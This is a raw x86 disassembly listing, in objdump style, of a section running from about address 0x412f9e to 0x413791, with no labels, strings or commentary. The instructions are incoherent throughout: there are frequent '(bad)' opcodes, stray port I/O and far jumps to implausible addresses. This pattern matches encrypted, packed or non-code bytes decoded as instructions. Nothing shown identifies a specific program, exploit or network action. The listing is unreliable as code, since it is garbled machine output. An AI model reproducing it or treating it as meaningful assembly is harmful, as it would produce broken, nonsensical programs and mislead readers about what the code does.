  412f9e:	xor    BYTE PTR [ebx-0x148ab2e],0x7b
  412fa5:	lds    ecx,FWORD PTR [edi-0x5472724d]
  412fab:	add    ecx,DWORD PTR [edx+0x509bbb72]
  412fb1:	ins    DWORD PTR es:[edi],dx
  412fb2:	repnz sub ah,BYTE PTR [ebx-0x72106392]
  412fb9:	mov    esp,0x7bf9663d
  412fbe:	push   edx
  412fbf:	jne    0x412fb3
  412fc1:	jg     0x41302a
  412fc3:	in     eax,0xf2
  412fc5:	(bad)  
  412fc7:	dec    ebp
  412fc8:	fsubr  DWORD PTR [esi-0x1a]
  412fcb:	int    0x62
  412fcd:	sub    al,0x9b
  412fcf:	cmp    esi,DWORD PTR [edi+0xf]
  412fd2:	test   BYTE PTR [esi],dl
  412fd4:	pop    esi
  412fd5:	shr    BYTE PTR [edi-0x7e2c8bf4],cl
  412fdb:	inc    ecx
  412fdc:	push   ebx
  412fdd:	xchg   ecx,eax
  412fde:	xchg   edi,eax
  412fdf:	cmp    eax,0xc7f72599
  412fe4:	stos   BYTE PTR es:[edi],al
  412fe5:	xor    eax,0xcabe6937
  412fea:	aam    0xa
  412fec:	mov    cl,0xad
  412fee:	lahf   
  412fef:	in     al,dx
  412ff0:	pop    ebp
  412ff1:	repnz mov BYTE PTR [esi+0x0],ah
  412ff5:	sub    eax,0xa7e20db0
  412ffa:	fcom   QWORD PTR [ebp+0x69d7c26d]
  413000:	xchg   ebx,eax
  413001:	dec    esp
  413002:	and    ch,BYTE PTR [esi]
  413004:	mov    DWORD PTR [edi+0x4f436bfc],ebp
  41300a:	cmp    BYTE PTR [ecx],0x8f
  41300d:	jmp    0x5ce3c91f
  413012:	js     0x412fe4
  413014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413015:	loop   0x412ff4
  413017:	sbb    eax,0x37287b73
  41301c:	scas   al,BYTE PTR es:[edi]
  41301d:	push   esi
  41301e:	adc    al,0xe3
  413020:	xchg   ebx,eax
  413021:	pushf  
  413022:	fld    TBYTE PTR [eax+0x703b5ff0]
  413028:	mov    al,ds:0xd171c11f
  41302d:	push   ebp
  41302e:	xor    DWORD PTR [eax+esi*1+0x46],edx
  413032:	inc    edx
  413033:	and    bl,bh
  413035:	pusha  
  413036:	dec    esi
  413037:	(bad)  
  413039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303a:	mov    al,0x29
  41303c:	fsubr  DWORD PTR [esp+eax*1]
  41303f:	jmp    0x413085
  413041:	xchg   ebp,eax
  413042:	aad    0x64
  413044:	pop    ebp
  413045:	xchg   ecx,eax
  413046:	or     eax,ecx
  413048:	iret   
  413049:	rcl    ebp,1
  41304b:	dec    esp
  41304c:	xchg   DWORD PTR [eax-0x5006e312],esp
  413052:	mov    ebx,0xb5dcc233
  413057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413058:	aaa    
  413059:	sbb    DWORD PTR [ecx],0x9491c0e5
  41305f:	push   ebp
  413060:	fwait
  413061:	hlt    
  413062:	frstor [esi-0x2]
  413065:	fld    TBYTE PTR gs:[ebx+0x44]
  413069:	jnp    0x41303e
  41306b:	sub    eax,0xd6eb3e99
  413070:	pusha  
  413071:	pop    esi
  413072:	xor    al,0xbf
  413074:	(bad)  
  413075:	pushf  
  413076:	inc    edi
  413077:	mov    bh,0x9
  413079:	gs push edi
  41307b:	push   0x2287bc6f
  413080:	das    
  413081:	pop    ecx
  413082:	xor    bl,BYTE PTR [ebp-0x5201a989]
  413088:	cmp    BYTE PTR [eax-0x1e10f0c7],bh
  41308e:	jno    0x4130ac
  413090:	xor    ch,BYTE PTR [ebp-0x37d6f872]
  413096:	xor    eax,0xd81bc0b5
  41309b:	mov    ch,0xb8
  41309d:	enter  0x6682,0xbd
  4130a1:	retf   0x9f12
  4130a4:	clc    
  4130a5:	std    
  4130a6:	not    ecx
  4130a8:	stos   BYTE PTR es:[edi],al
  4130a9:	inc    esp
  4130aa:	inc    esp
  4130ab:	in     al,0xd6
  4130ad:	xor    eax,0xe3de886c
  4130b3:	fdivp  st(0),st
  4130b5:	jmp    0x6aac5a4
  4130ba:	gs jg  0x413083
  4130bd:	xchg   DWORD PTR [esi+edx*4],ebp
  4130c0:	stos   BYTE PTR es:[edi],al
  4130c1:	push   edi
  4130c2:	jl     0x413044
  4130c4:	add    BYTE PTR [edx+0x58],bl
  4130c7:	imul   esi,esp,0xe5c40484
  4130cd:	shl    DWORD PTR [ecx+0x17af62b4],cl
  4130d3:	jge    0x4130e7
  4130d5:	fwait
  4130d6:	sbb    DWORD PTR [eax+eiz*4],0xabc9f44c
  4130dd:	push   es
  4130de:	push   ds
  4130df:	ins    BYTE PTR es:[edi],dx
  4130e0:	ror    BYTE PTR [edi+0x45003e64],cl
  4130e6:	retf   0xe22d
  4130e9:	and    DWORD PTR [ecx-0x7f0ecbda],edx
  4130ef:	aas    
  4130f0:	push   0xffffffb0
  4130f2:	push   es
  4130f3:	in     al,dx
  4130f4:	adc    BYTE PTR ds:0x1de1fe9f,ch
  4130fa:	fidiv  WORD PTR [ebx]
  4130fc:	popa   
  4130fd:	ret    
  4130fe:	(bad)  
  4130ff:	lods   al,BYTE PTR ds:[esi]
  413100:	into   
  413101:	mov    ebx,0x25ef284d
  413106:	pop    eax
  413107:	lods   eax,DWORD PTR ds:[esi]
  413108:	mov    ebx,es
  41310a:	add    al,0xcb
  41310d:	sub    ebx,DWORD PTR [edx]
  41310f:	push   ecx
  413110:	dec    esi
  413111:	pop    edx
  413112:	loopne 0x4130ad
  413114:	ins    DWORD PTR es:[edi],dx
  413115:	int    0x28
  413117:	mov    cl,0xde
  413119:	push   cs
  41311a:	xchg   ecx,eax
  41311b:	faddp  st(2),st
  41311d:	loope  0x413116
  41311f:	gs scas al,BYTE PTR es:[edi]
  413121:	pop    ebx
  413122:	xor    eax,0x149be99b
  413127:	ins    DWORD PTR es:[edi],dx
  413128:	dec    ecx
  413129:	dec    esp
  41312a:	sahf   
  41312b:	fsubr  st,st(0)
  41312d:	xchg   ecx,eax
  41312e:	jl     0x413105
  413130:	xor    esi,DWORD PTR [ecx-0x6d4b7bfa]
  413136:	lock imul eax,DWORD PTR [eax+0x4235fca4],0xffffffa8
  41313e:	sti    
  41313f:	push   0x43628679
  413144:	adc    al,0x40
  413146:	sbb    al,0x10
  413148:	sbb    eax,0x7863cebf
  41314d:	enter  0x88ee,0x1c
  413151:	into   
  413152:	cdq    
  413153:	ja     0x413175
  413155:	jb     0x4131c4
  413157:	jmp    0xe2d1:0x18c80abb
  41315e:	mov    ds:0x61c2f904,al
  413163:	data16 into 
  413165:	call   DWORD PTR [ebx]
  413167:	popf   
  413168:	push   cs
  413169:	jge    0x4130fe
  41316b:	lds    ebp,FWORD PTR [eax-0x74]
  41316e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316f:	jge    0x41316d
  413171:	push   ebx
  413172:	add    eax,0xe8f00b2f
  413177:	stos   BYTE PTR es:[edi],al
  413178:	mov    ebp,0xbfc94307
  41317d:	gs loopne 0x413169
  413180:	jmp    0xfbe1809d
  413185:	rcl    BYTE PTR [eax+0x80a3d46],cl
  41318b:	xchg   esp,eax
  41318c:	rcl    dl,0x97
  41318f:	aam    0x72
  413191:	and    DWORD PTR [ebx],edx
  413193:	sbb    al,0x69
  413195:	sub    al,0x28
  413197:	or     edx,DWORD PTR [ebp+0x52a299e5]
  41319d:	sahf   
  41319e:	xor    eax,0xff08f78e
  4131a3:	nop
  4131a4:	add    eax,0x4a9bf035
  4131aa:	popa   
  4131ab:	pop    edx
  4131ac:	shr    DWORD PTR [esi-0x13],1
  4131af:	mov    edi,0xc0729fe0
  4131b4:	sbb    eax,DWORD PTR [esi]
  4131b6:	or     BYTE PTR [edi+0x38],0xf9
  4131ba:	xchg   esp,eax
  4131bb:	(bad)  
  4131bd:	das    
  4131be:	xor    bh,bh
  4131c0:	test   DWORD PTR [ecx+0x5],ebx
  4131c3:	inc    edi
  4131c4:	push   ebp
  4131c5:	and    DWORD PTR [ebp-0x60],ebx
  4131c8:	int3   
  4131c9:	xor    ebp,esi
  4131cb:	mov    esi,0xa37bf146
  4131d0:	stos   DWORD PTR es:[edi],eax
  4131d1:	in     eax,0x5
  4131d3:	xor    eax,0x268a9a6b
  4131d8:	cmp    DWORD PTR [edi+esi*8+0x27],0xffffffa2
  4131dd:	rol    DWORD PTR [edx],0xd3
  4131e0:	cmc    
  4131e1:	sbb    al,0x24
  4131e4:	stos   BYTE PTR es:[edi],al
  4131e5:	add    BYTE PTR [ecx+0x1723af98],bh
  4131eb:	(bad)  
  4131ec:	popa   
  4131ed:	(bad)  [eax-0x22]
  4131f0:	sub    DWORD PTR [esi-0x45bda5da],ebx
  4131f6:	cmp    al,0xd6
  4131f8:	or     bh,BYTE PTR [esi+0x3]
  4131fb:	dec    esp
  4131fc:	retf   0x14cf
  4131ff:	xor    ecx,DWORD PTR [ebx-0x1da90a05]
  413205:	inc    esi
  413206:	jo     0x4131de
  413208:	test   eax,0xeec31d4
  41320d:	xchg   esp,eax
  41320e:	cld    
  41320f:	xchg   ebp,eax
  413210:	mov    ebp,0xdab9ec6a
  413215:	inc    esi
  413216:	jno    0x413243
  413218:	jl     0x413253
  41321a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41321b:	sar    BYTE PTR [ecx-0x51898298],0xd7
  413222:	inc    esi
  413223:	jnp    0x413257
  413225:	cmp    al,0x7f
  413227:	addr16 (bad) 
  413229:	dec    DWORD PTR [esi+0x64]
  41322c:	data16 mov dh,0x40
  41322f:	icebp  
  413230:	dec    esp
  413231:	push   edx
  413232:	push   edi
  413233:	adc    dl,BYTE PTR ds:0x210302f3
  413239:	repz dec ebx
  41323b:	mov    cl,0xe3
  41323d:	sahf   
  41323e:	sub    DWORD PTR [edi-0x5c],0xffffff9e
  413242:	loope  0x4131f2
  413244:	shl    BYTE PTR [ebx-0x5c],1
  413247:	cdq    
  413248:	cmc    
  413249:	mov    ds:0x7d60e64a,al
  41324e:	or     al,0xb8
  413250:	imul   ecx,eax,0xffffffab
  413253:	in     al,dx
  413254:	inc    esp
  413255:	or     edi,DWORD PTR [ebp-0x47024d59]
  41325b:	repnz (bad) 
  41325d:	xor    bh,ah
  41325f:	xor    al,0x1d
  413261:	ret    0xabf0
  413264:	repz mov edi,0x20c4bff
  41326a:	jecxz  0x413211
  41326c:	mov    ecx,DWORD PTR [edi*1+0x5370348]
  413273:	pop    ebp
  413274:	mov    bh,0x54
  413276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413277:	repnz (bad) 
  413279:	in     eax,0xfe
  41327b:	adc    esi,DWORD PTR ds:0x2d3f4306
  413281:	loope  0x41321d
  413283:	jmp    0x15dc4176
  413288:	push   ecx
  413289:	mov    cl,0x71
  41328b:	xchg   edi,eax
  41328c:	add    esi,0x68
  41328f:	retf   
  413290:	xchg   ecx,eax
  413291:	jo     0x4132f3
  413293:	jl     0x413260
  413295:	mov    al,0xea
  413297:	jbe    0x413249
  413299:	data16 sahf 
  41329b:	data16 cmp BYTE PTR [eax-0x4c21dc80],al
  4132a2:	repz in eax,0x89
  4132a5:	fucomp st(0)
  4132a7:	inc    edx
  4132a8:	pop    edi
  4132a9:	data16 je 0x4132d2
  4132ac:	jno    0x4132cf
  4132ae:	or     DWORD PTR ds:[edx],ecx
  4132b1:	xchg   esi,eax
  4132b2:	mov    DWORD PTR [ebx-0x19],ecx
  4132b5:	mov    edi,0xc0800e5b
  4132ba:	int    0x92
  4132bc:	xor    esi,DWORD PTR [edi]
  4132be:	pop    esp
  4132bf:	or     eax,0x81cbba7a
  4132c4:	pop    ds
  4132c5:	bound  edi,QWORD PTR [esi-0x12]
  4132c8:	adc    BYTE PTR ds:0x54c4f00d,dh
  4132ce:	mov    ebp,0x2db02cb2
  4132d3:	test   DWORD PTR [edx-0x66],esi
  4132d6:	ins    BYTE PTR es:[edi],dx
  4132d7:	inc    ecx
  4132d8:	cmc    
  4132d9:	(bad)  
  4132db:	xchg   ecx,eax
  4132dc:	inc    eax
  4132dd:	imul   esi,ecx,0x2faa450c
  4132e3:	leave  
  4132e4:	cmp    ebx,esi
  4132e6:	jo     0x413367
  4132e8:	(bad)  [ecx-0x6ef3cb0a]
  4132ee:	inc    eax
  4132ef:	int3   
  4132f0:	jb     0x41328e
  4132f2:	mov    ch,0x64
  4132f4:	ss in  al,0x35
  4132f7:	jg     0x41331a
  4132f9:	(bad)  
  4132fa:	je     0x41336b
  4132fc:	mov    al,0x0
  4132fe:	jnp    0x413330
  413300:	ret    
  413301:	xchg   ebx,eax
  413302:	or     eax,0xd9a93214
  413307:	popf   
  413308:	inc    ecx
  413309:	jne    0x4132a4
  41330b:	and    DWORD PTR [ebx+0x47],edi
  41330e:	push   0x20
  413310:	idiv   ah
  413312:	popa   
  413313:	mov    al,0x69
  413315:	hlt    
  413316:	xor    ecx,DWORD PTR [eax+0x75]
  413319:	scas   al,BYTE PTR es:[edi]
  41331a:	(bad)
  41331d:	and    BYTE PTR [edx],0x1d
  413320:	sbb    eax,ecx
  413322:	push   esi
  413323:	pop    DWORD PTR [ebp+0x48]
  413326:	cmp    al,0x17
  413328:	xchg   esp,eax
  413329:	sub    BYTE PTR [eax+0x25bf6666],cl
  41332f:	mov    al,0xec
  413331:	fnstenv [edx+0x29]
  413334:	leave  
  413335:	dec    esp
  413336:	xor    eax,0x52f5da5
  41333b:	mov    esp,0xf00df967
  413340:	shl    DWORD PTR [ebx],cl
  413342:	clc    
  413343:	outs   dx,DWORD PTR ds:[esi]
  413344:	cs adc eax,0xab47a68f
  41334a:	arpl   cx,bx
  41334c:	data16 sub al,0x8a
  41334f:	jp     0x413340
  413351:	inc    ebx
  413352:	mov    edi,0x6b02fbb9
  413357:	sar    dl,0xba
  41335a:	ret    
  41335b:	add    eax,0x7c49875a
  413360:	data16 fistp DWORD PTR [ecx-0xe]
  413364:	sbb    al,0x74
  413366:	mov    al,ds:0xa68e6a5
  41336b:	js     0x4133cb
  41336d:	(bad)  
  41336e:	ins    DWORD PTR es:[edi],dx
  41336f:	stc    
  413370:	loopne 0x4133d8
  413372:	pop    ds
  413373:	jnp    0x41334d
  413375:	repz aas 
  413377:	add    eax,0xbf2a2f31
  41337c:	ret    0xcceb
  41337f:	test   DWORD PTR [edx],0x9ce14681
  413385:	lea    edx,[ecx]
  413387:	loopne 0x41337d
  413389:	mov    esi,0xc2d4138c
  41338e:	out    dx,eax
  41338f:	mov    es,edx
  413391:	jmp    0x41338b
  413393:	(bad)  
  413394:	jle    0x413336
  413396:	in     al,0x51
  413398:	test   DWORD PTR [ebp+0x3],edx
  41339b:	fsub   DWORD PTR [ebp-0x1ce8340a]
  4133a1:	pop    es
  4133a2:	fmul   DWORD PTR [ebp-0x67]
  4133a5:	jp     0x41338c
  4133a7:	fwait
  4133a8:	xchg   ecx,eax
  4133a9:	fdiv   QWORD PTR [edx-0xd1b48fe]
  4133af:	aaa    
  4133b0:	int    0xe8
  4133b2:	rcl    edi,cl
  4133b4:	imul   esi,esi,0x8d553125
  4133ba:	mov    ss,WORD PTR [ecx-0x51]
  4133bd:	popa   
  4133be:	inc    ebx
  4133bf:	mov    eax,0x35fd7dee
  4133c4:	sub    al,0x55
  4133c6:	xlat   BYTE PTR ds:[ebx]
  4133c7:	into   
  4133c8:	sub    BYTE PTR [ecx+0x19],cl
  4133cb:	jle    0x41342d
  4133cd:	scas   al,BYTE PTR es:[edi]
  4133ce:	push   esi
  4133cf:	inc    edx
  4133d0:	jg     0x41342c
  4133d2:	aas    
  4133d3:	aaa    
  4133d4:	add    al,0x41
  4133d6:	popa   
  4133d7:	sub    DWORD PTR [ecx-0x1ce5eab4],0xffffff96
  4133de:	sub    eax,0x2c0a2b26
  4133e3:	lock adc ecx,DWORD PTR [esp+edi*4+0x23]
  4133e8:	ret    
  4133e9:	push   es
  4133ea:	neg    ecx
  4133ec:	mov    bh,0x31
  4133ee:	pop    DWORD PTR [edx]
  4133f0:	push   eax
  4133f1:	aad    0x8d
  4133f3:	cmp    edx,DWORD PTR [edx-0x7e]
  4133f6:	in     eax,dx
  4133f7:	pop    ss
  4133f8:	aaa    
  4133f9:	mov    DWORD PTR [ecx+0x1a],0x9fc82402
  413400:	pop    edi
  413401:	inc    ebx
  413402:	pop    edx
  413403:	ds call 0x9e29be6e
  413409:	clc    
  41340a:	mov    ch,0xe7
  41340c:	ds xchg edi,edx
  41340f:	int    0xc4
  413411:	(bad)  
  413412:	test   eax,0xf284a048
  413417:	das    
  413418:	pusha  
  413419:	mov    bl,0x9e
  41341b:	test   bl,cl
  41341d:	sbb    eax,0xadd4e0db
  413422:	jbe    0x413481
  413424:	add    BYTE PTR [ebx+edx*8+0x6f],al
  413428:	mov    eax,0x11d3fa10
  41342d:	dec    eax
  41342e:	in     eax,0x30
  413430:	pop    ebx
  413431:	ror    BYTE PTR [eax-0x13],cl
  413434:	cwde   
  413435:	and    eax,0x499f9135
  41343a:	xchg   edi,eax
  41343b:	inc    esp
  41343c:	and    eax,DWORD PTR [ebx+esi*4+0x28]
  413440:	retf   0x2fe6
  413443:	test   eax,0xae0dccff
  413448:	ds enter 0x8117,0x7b
  41344d:	cmc    
  41344e:	inc    ebp
  41344f:	lds    edi,FWORD PTR ds:0xfa102c05
  413455:	(bad)  
  413457:	(bad)  
  413458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413459:	dec    esp
  41345a:	xchg   edi,eax
  41345b:	int    0xd4
  41345d:	stos   BYTE PTR es:[edi],al
  41345e:	jmp    0x927ffa36
  413463:	xchg   edi,eax
  413464:	and    eax,0x122b9f50
  413469:	aam    0x64
  41346b:	mov    bl,0x67
  41346d:	rcr    BYTE PTR [esi],1
  41346f:	xor    DWORD PTR [edi],0xc1cd1eca
  413475:	pop    esi
  413476:	or     al,0xcc
  413478:	gs inc ebx
  41347a:	sub    al,0xbf
  41347c:	pushf  
  41347d:	jmp    0x917ff2d7
  413482:	dec    ebx
  413483:	cs pop ebx
  413485:	mov    edi,0x9c54b24
  41348a:	push   edi
  41348b:	(bad)  
  41348c:	mul    DWORD PTR [edi]
  41348e:	mov    edx,0xb9b50c1f
  413493:	or     ah,ah
  413495:	loop   0x413454
  413497:	xchg   ebp,eax
  413498:	ja     0x413433
  41349a:	xchg   ebp,eax
  41349b:	dec    esp
  41349c:	cmc    
  41349d:	mov    WORD PTR [esi+0x66],?
  4134a0:	and    BYTE PTR [eax],ah
  4134a2:	enter  0x388f,0x8e
  4134a6:	inc    ebx
  4134a7:	adc    eax,0xb33e422c
  4134ac:	outs   dx,DWORD PTR ds:[esi]
  4134ad:	lods   eax,DWORD PTR ds:[esi]
  4134ae:	ss add eax,0xcb973bb1
  4134b4:	mov    cl,0x99
  4134b6:	adc    eax,DWORD PTR [eax+0x7]
  4134b9:	test   eax,0x8037b7de
  4134be:	xor    eax,0x1299b9a8
  4134c3:	daa    
  4134c4:	ret    0xe0a6
  4134c7:	mov    edi,0x98403a42
  4134cc:	xchg   esi,eax
  4134cd:	xor    eax,DWORD PTR [ecx+0x11]
  4134d0:	les    ebp,FWORD PTR [edi+edi*8-0x22ae0b2c]
  4134d7:	dec    edx
  4134d8:	pop    ds
  4134d9:	loopne 0x4134f0
  4134db:	or     DWORD PTR [ebx-0x62],edx
  4134de:	aam    0x9c
  4134e0:	lea    edi,[esi-0x49bde90]
  4134e6:	mov    edi,0x6b0dd1db
  4134eb:	pushf  
  4134ec:	adc    DWORD PTR [esi-0x2745e500],ebx
  4134f2:	xchg   DWORD PTR [eax],esp
  4134f4:	xlat   BYTE PTR ds:[ebx]
  4134f5:	push   es
  4134f6:	test   DWORD PTR [eax-0x332e750f],ecx
  4134fc:	in     al,dx
  4134fd:	push   ss
  4134fe:	fistp  DWORD PTR [ecx]
  413500:	xor    ebp,eax
  413502:	xchg   esi,eax
  413503:	mov    dl,0x95
  413505:	ins    BYTE PTR es:[edi],dx
  413506:	inc    eax
  413507:	std    
  413508:	and    cl,ah
  41350a:	mov    cl,0xbf
  41350c:	mov    ebx,0x2d5b52ef
  413511:	mov    ecx,0x7cdb7719
  413516:	dec    esi
  413517:	mov    dl,BYTE PTR [ebx+ebx*1]
  41351a:	out    0xf,eax
  41351c:	sbb    BYTE PTR [edx-0x68],cl
  41351f:	inc    edx
  413520:	fnstsw WORD PTR [ecx+0x2b719185]
  413526:	fld    QWORD PTR [ecx]
  413528:	scas   al,BYTE PTR es:[edi]
  413529:	int3   
  41352a:	adc    al,0x53
  41352c:	stc    
  41352d:	pop    eax
  41352e:	pop    esp
  41352f:	fdivr  DWORD PTR [ebx]
  413531:	cmp    DWORD PTR [ebx],0x2b061347
  413537:	and    esp,DWORD PTR [edx]
  413539:	xlat   BYTE PTR ds:[ebx]
  41353a:	sbb    dh,bl
  41353c:	pop    esi
  41353d:	es stc 
  41353f:	aaa    
  413540:	jbe    0x4135b0
  413542:	fnsave [edi]
  413544:	out    dx,eax
  413545:	pop    ss
  413546:	mov    bl,BYTE PTR [eax-0x49]
  413549:	xor    BYTE PTR [edx-0x57ed8ad0],ah
  41354f:	psubq  mm7,QWORD PTR [ecx+0x60a47a99]
  413556:	push   esi
  413557:	shl    DWORD PTR [ebp-0xc],cl
  41355a:	add    eax,0xcdd5fe90
  41355f:	xchg   ebx,eax
  413560:	jo     0x413592
  413562:	mov    dh,0xa
  413564:	inc    ebx
  413565:	dec    edi
  413566:	push   ss
  413567:	gs dec edx
  413569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41356a:	or     ebx,edx
  41356c:	push   ecx
  41356d:	loope  0x413596
  41356f:	jbe    0x41355a
  413571:	out    dx,al
  413572:	sub    al,0x59
  413574:	bound  edx,QWORD PTR [ebp-0x54]
  413577:	fwait
  413578:	imul   edi,esp,0x174f9fa8
  41357e:	pop    ss
  41357f:	cmp    eax,0x80e14377
  413584:	mov    esi,DWORD PTR [ebx+0x63]
  413587:	dec    ebp
  413588:	dec    edi
  413589:	dec    edi
  41358a:	out    0xfb,al
  41358c:	in     eax,0x8a
  41358e:	aad    0x4d
  413590:	in     al,0xd
  413592:	pop    es
  413593:	mov    ?,WORD PTR [esi]
  413595:	mov    ebp,0x2396e00e
  41359a:	inc    esi
  41359b:	cwde   
  41359c:	imul   edx,DWORD PTR [edi],0xffffffec
  41359f:	std    
  4135a0:	xlat   BYTE PTR ds:[ebx]
  4135a1:	inc    ebp
  4135a2:	test   BYTE PTR [ecx],bl
  4135a4:	ficomp DWORD PTR [esi]
  4135a6:	mov    ah,0xf8
  4135a8:	push   0x4c
  4135aa:	mov    al,0x6d
  4135ac:	jecxz  0x4135bb
  4135ae:	ins    DWORD PTR es:[edi],dx
  4135af:	mov    ecx,0xb4aba20c
  4135b4:	loopne 0x41358f
  4135b6:	push   edx
  4135b7:	jecxz  0x4135c6
  4135b9:	es sbb al,0x9a
  4135bc:	adc    BYTE PTR [eax-0x26],dl
  4135bf:	test   DWORD PTR [esi+ecx*2-0xd2df015],0x766e8de5
  4135ca:	or     edi,esp
  4135cc:	xor    al,0x5c
  4135ce:	mov    ecx,0x9591783f
  4135d3:	inc    edx
  4135d4:	aad    0xaf
  4135d6:	mov    dh,0x48
  4135d8:	adc    DWORD PTR [ecx+0x5033cf8c],esp
  4135de:	lods   al,BYTE PTR ds:[esi]
  4135df:	das    
  4135e0:	jne    0x4135ac
  4135e2:	sbb    eax,0xdc4ecfb7
  4135e7:	mov    cl,BYTE PTR [ecx+0x1db17d64]
  4135ed:	(bad)  
  4135ee:	mov    bl,0x5d
  4135f0:	and    esp,ecx
  4135f2:	jl     0x413666
  4135f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f5:	call   0x148fbadf
  4135fa:	push   ss
  4135fb:	fdiv   QWORD PTR [edi+0x4b]
  4135fe:	shl    dh,cl
  413600:	popa   
  413601:	inc    eax
  413602:	cmp    ebx,ecx
  413604:	pop    edx
  413605:	sub    eax,0x2de3bd2e
  41360a:	(bad)  
  41360b:	jae    0x4135d0
  41360d:	into   
  41360e:	mov    ebp,gs
  413610:	mov    ds,ebx
  413612:	cmp    eax,0xfbb0f937
  413617:	inc    edi
  413618:	sbb    BYTE PTR [eax-0x3],dh
  41361b:	daa    
  41361c:	jecxz  0x413658
  41361e:	pop    ebx
  41361f:	lea    edx,[ebx-0x79]
  413622:	out    dx,al
  413623:	stos   DWORD PTR es:[edi],eax
  413624:	out    0xb1,al
  413626:	(bad)  
  413627:	jne    0x413625
  413629:	jmp    0x6fa5:0xeb34896c
  413630:	sbb    BYTE PTR [edi+0x2e],0xc0
  413634:	add    dl,BYTE PTR [ecx]
  413636:	rcr    BYTE PTR ds:0x281f2401,0x2d
  41363d:	push   0x54
  41363f:	test   BYTE PTR [eax],bl
  413641:	mul    BYTE PTR [esi-0x669784fd]
  413647:	dec    esp
  413648:	cmp    ebp,esi
  41364a:	xor    esp,DWORD PTR [ecx]
  41364c:	adc    esp,DWORD PTR fs:[esi-0xf5430e9]
  413653:	pushf  
  413654:	push   esi
  413655:	outs   dx,DWORD PTR ds:[esi]
  413656:	sub    eax,0x1bc29ada
  41365b:	cmp    BYTE PTR [esi-0x6c],ah
  41365e:	cmp    BYTE PTR [eax+0x1],bh
  413661:	push   edx
  413662:	lea    ecx,[ecx-0x6a]
  413665:	mov    ah,0xee
  413667:	out    0x83,eax
  413669:	xchg   edx,eax
  41366a:	mov    al,0x4d
  41366c:	inc    DWORD PTR [eax+eiz*4]
  41366f:	adc    eax,0x42444b24
  413674:	pusha  
  413675:	in     al,0x42
  413677:	(bad)  
  413678:	sub    bh,BYTE PTR [edx+0x6d]
  41367b:	mov    ah,0x1f
  41367d:	xchg   esi,eax
  41367e:	sbb    eax,0xfb4b8c97
  413683:	or     eax,0x1db358e5
  413688:	mov    bl,0x6f
  41368a:	inc    edi
  41368b:	jmp    0x8049fc59
  413690:	dec    esi
  413691:	loope  0x413626
  413693:	imul   ebx,DWORD PTR [ebx-0x1b1e57db],0xffffffe4
  41369a:	mov    ah,0xf4
  41369c:	adc    ah,dl
  41369e:	push   ebx
  41369f:	dec    eax
  4136a0:	mov    cl,0x4f
  4136a2:	xchg   edx,eax
  4136a3:	adc    eax,0x4cd87742
  4136a8:	outs   dx,BYTE PTR ds:[esi]
  4136a9:	dec    ebx
  4136aa:	adc    eax,DWORD PTR [ebx-0x7d930d6c]
  4136b0:	cmp    DWORD PTR [edx+0x4556fe69],esp
  4136b6:	push   0x997fb8bd
  4136bb:	fcmovnbe st,st(1)
  4136bd:	adc    BYTE PTR [eax],0x6c
  4136c0:	mov    al,ds:0x75f781aa
  4136c5:	ins    BYTE PTR es:[edi],dx
  4136c6:	call   0x77f36dd9
  4136cb:	xchg   edi,eax
  4136cc:	inc    ebp
  4136cd:	(bad)
  4136d0:	lods   eax,DWORD PTR ds:[esi]
  4136d1:	push   ecx
  4136d2:	mov    edi,0xc3705110
  4136d7:	or     DWORD PTR [ecx-0x26d75900],esi
  4136dd:	jl     0x41372d
  4136df:	ror    DWORD PTR gs:[eax-0x226f2f59],cl
  4136e6:	inc    ebp
  4136e7:	ret    
  4136e8:	sbb    eax,0xbf731e16
  4136ed:	lods   al,BYTE PTR ds:[esi]
  4136ee:	stos   DWORD PTR es:[edi],eax
  4136ef:	xchg   ebp,eax
  4136f0:	sub    cl,BYTE PTR [edi+ecx*1+0x30]
  4136f4:	jnp    0x413689
  4136f6:	lds    ecx,FWORD PTR [eax+0x6d94c14e]
  4136fc:	cmc    
  4136fd:	xchg   esi,eax
  4136fe:	mov    ch,al
  413700:	in     al,0xd
  413702:	inc    ecx
  413703:	imul   ah
  413705:	mov    edx,esi
  413707:	xor    esp,esi
  413709:	test   eax,0xc2c74909
  41370e:	das    
  41370f:	and    dh,ch
  413711:	ja     0x41373a
  413713:	sahf   
  413714:	cmp    al,0xa3
  413716:	xor    edx,DWORD PTR [edx-0x7b]
  413719:	jg     0x41371e
  41371b:	lds    edi,FWORD PTR [edi]
  41371d:	sub    esp,eax
  41371f:	sbb    ebp,DWORD PTR [eax-0x2244095d]
  413725:	xchg   edx,eax
  413726:	xchg   edi,eax
  413727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413728:	or     BYTE PTR [edx+0x35],bh
  41372b:	jns    0x413717
  41372d:	sbb    DWORD PTR [ebp+0x1cee7640],edi
  413733:	jl     0x413768
  413735:	cmp    BYTE PTR [ecx-0x772ca6df],dh
  41373b:	mov    bl,0xfb
  41373d:	arpl   ax,sp
  41373f:	push   edx
  413740:	dec    edi
  413741:	in     eax,0x26
  413743:	inc    esi
  413744:	test   DWORD PTR [ebx],esp
  413746:	imul   esp,edi,0xda083f3b
  41374c:	(bad)  [ebp-0x23578645]
  413752:	mov    dh,0xc8
  413754:	push   edx
  413755:	dec    ebp
  413756:	iret   
  413757:	add    edi,edi
  413759:	ret    0xcc4e
  41375c:	mov    al,0x9c
  41375e:	ret    
  41375f:	lea    eax,[edx+0x24]
  413762:	inc    ebx
  413763:	fwait
  413764:	out    0x97,eax
  413766:	sbb    BYTE PTR [ebp+0x75],0xb2
  41376a:	xor    BYTE PTR [ebx],0x1f
  41376d:	je     0x4136fb
  41376f:	xchg   ecx,eax
  413770:	sbb    eax,0xcaad5cf1
  413775:	mov    bh,0x5
  413777:	pop    es
  413778:	scas   eax,DWORD PTR es:[edi]
  413779:	sar    BYTE PTR ds:0xa4f2afbb,1
  41377f:	add    eax,0x224fceea
  413784:	add    al,0x59
  413786:	push   ecx
  413787:	fmul   QWORD PTR [ecx-0x53]
  41378a:	pop    ebp
  41378b:	mov    ebp,0x8bd21c68
  413790:	retf   
  413791:	inc    eax
